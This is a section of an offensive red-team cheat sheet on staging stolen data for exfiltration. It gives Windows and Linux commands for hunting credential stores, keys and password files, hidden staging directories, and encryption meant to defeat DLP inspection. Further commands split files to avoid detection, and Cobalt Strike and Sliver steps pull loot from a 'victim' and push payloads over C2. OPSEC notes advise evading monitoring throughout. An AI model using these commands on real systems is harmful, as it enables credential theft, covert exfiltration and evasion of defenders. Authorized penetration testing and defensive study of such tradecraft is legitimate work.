## Data Staging & Preparation

Identifying, collecting, and preparing target data before exfiltrating. Stage files in a single location, compress and encrypt to reduce volume and avoid content inspection.

> **OPSEC:** Stage data in directories that blend with normal system activity. Avoid `C:\Users\Public\` — it's commonly monitored. Encrypt archives to defeat DLP / content inspection on the wire.

---
### Data Discovery

Locate high-value files on target systems before staging.

#### Cobalt Strike
```sh
# Search for interesting file types
beacon> shell dir /s /b C:\Users\*.kdbx C:\Users\*.rdg C:\Users\*.config
beacon> shell dir /s /b C:\Users\*.docx C:\Users\*.xlsx C:\Users\*.pdf
beacon> shell findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.config

# PowerShell via beacon
beacon> powershell Get-ChildItem -Path C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.pfx,*.key,*.pem -ErrorAction SilentlyContinue
```

#### Sliver
```sh
sliver> execute -o cmd.exe /c "dir /s /b C:\Users\*.kdbx C:\Users\*.rdg C:\Users\*.config"
sliver> execute -o powershell.exe -nop -c "Get-ChildItem -Path C:\Users\ -Recurse -Include *.docx,*.xlsx,*.pdf,*.kdbx -ErrorAction SilentlyContinue | Select FullName"
```

#### Manual
```sh
# Windows — findstr for keywords in files
findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini
dir /s /b C:\Users\*.kdbx C:\Users\*.rdg C:\Users\*.pfx C:\Users\*.key

# Windows — PowerShell
Get-ChildItem -Path C:\Users\ -Recurse -Include *.docx,*.xlsx,*.pdf,*.kdbx,*.config,*.rdg -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime

# Linux
find / -type f \( -name "*.conf" -o -name "*.kdbx" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa" \) 2>/dev/null
grep -rl "password" /home/ /opt/ /etc/ 2>/dev/null
```

---
### Staging Locations

Collect target files into a single directory before compression/exfil.

#### Windows
```sh
# Safe staging locations (blend with normal activity)
C:\ProgramData\                    # hidden by default, writable
C:\Windows\Temp\                   # SYSTEM-writable, noisy — use sparingly
%APPDATA%\Microsoft\               # per-user, blends with Office artefacts
%LOCALAPPDATA%\Temp\               # per-user temp

# Create staging dir
mkdir C:\ProgramData\PackageCache\updates
```

#### Linux
```sh
# Preferred staging directories
/dev/shm/                          # tmpfs — in-memory, no disk writes
/tmp/                              # world-writable
/var/tmp/                          # persists across reboots (unlike /tmp on some distros)

mkdir -p /dev/shm/.cache
```

---
### Compression

Reduce data volume before exfil. Password-protect archives to defeat DLP content inspection.

#### Manual
```powershell
# PowerShell — Compress-Archive
Compress-Archive -Path C:\ProgramData\staging\* -DestinationPath C:\ProgramData\staging\data.zip

# 7-Zip — password-protected (best option)
7z a -p"Str0ngP@ss!" -mhe=on C:\ProgramData\data.7z C:\ProgramData\staging\*
# -mhe=on encrypts filenames too

# makecab — native Windows, no dependencies (single files only)
makecab C:\ProgramData\staging\creds.txt C:\ProgramData\staging\creds.cab
```
```sh
# Linux — tar + gzip
tar -czf /dev/shm/.cache/data.tar.gz -C /tmp/staging .

# Linux — zip with password
zip -r -P 'Str0ngP@ss!' /dev/shm/.cache/data.zip /tmp/staging/
```

---
### Encryption Before Exfil

Encrypt staged data independently of archive passwords for an additional layer.

#### Manual
```sh
# GPG — symmetric encryption
gpg -c --cipher-algo AES256 data.tar.gz
# produces data.tar.gz.gpg — prompts for passphrase

# GPG — decrypt
gpg -d data.tar.gz.gpg > data.tar.gz

# OpenSSL
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc
openssl enc -d -aes-256-cbc -pbkdf2 -in data.enc -out data.tar.gz
```
```powershell
# PowerShell — AES encryption
$key = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes("P@ssw0rd", [byte[]](1..16), 10000)).GetBytes(32)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.GenerateIV()

$inBytes = [IO.File]::ReadAllBytes("C:\ProgramData\data.zip")
$encryptor = $aes.CreateEncryptor()
$encBytes = $encryptor.TransformFinalBlock($inBytes, 0, $inBytes.Length)

# Prepend IV to ciphertext
[IO.File]::WriteAllBytes("C:\ProgramData\data.enc", $aes.IV + $encBytes)
```

---
### Splitting Large Files

Break large archives into smaller chunks to avoid transfer limits or reduce detection.

#### Manual
```sh
# Linux — split into 1MB chunks
split -b 1M data.tar.gz data.tar.gz.part_
# produces data.tar.gz.part_aa, part_ab, etc.

# Reassemble
cat data.tar.gz.part_* > data.tar.gz
```
```powershell
# PowerShell — byte chunking
$chunkSize = 1MB
$bytes = [IO.File]::ReadAllBytes("C:\ProgramData\data.zip")
$chunks = [Math]::Ceiling($bytes.Length / $chunkSize)
for ($i = 0; $i -lt $chunks; $i++) {
    $offset = $i * $chunkSize
    $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
    $chunk = New-Object byte[] $length
    [Array]::Copy($bytes, $offset, $chunk, 0, $length)
    [IO.File]::WriteAllBytes("C:\ProgramData\data_part$i.bin", $chunk)
}

# Reassemble
$parts = Get-ChildItem C:\ProgramData\data_part*.bin | Sort-Object Name
$out = [IO.File]::Create("C:\ProgramData\data.zip")
foreach ($p in $parts) { $b = [IO.File]::ReadAllBytes($p.FullName); $out.Write($b, 0, $b.Length) }
$out.Close()
```

---
### C2 Download / Upload

Built-in C2 file transfer for small-to-medium volumes.

#### Cobalt Strike
```sh
# Download file from target to team server
beacon> download C:\ProgramData\data.7z

# Download multiple via wildcard
beacon> download C:\Users\victim\Documents\*.xlsx

# Upload file to target
beacon> upload /opt/tools/payload.exe

# Check download progress
beacon> downloads
beacon> cancel <download_id>
```

> **OPSEC:** `download` uses the existing beacon channel — no new connections. Bandwidth is limited by beacon sleep interval. Large downloads will be slow on slow beacons; consider reducing sleep temporarily.

#### Sliver
```sh
# Download from target
sliver> download C:\ProgramData\data.7z /tmp/loot/

# Download directory recursively
sliver> download C:\ProgramData\staging\ /tmp/loot/ -r

# Upload to target
sliver> upload /opt/tools/payload.exe C:\ProgramData\payload.exe
```
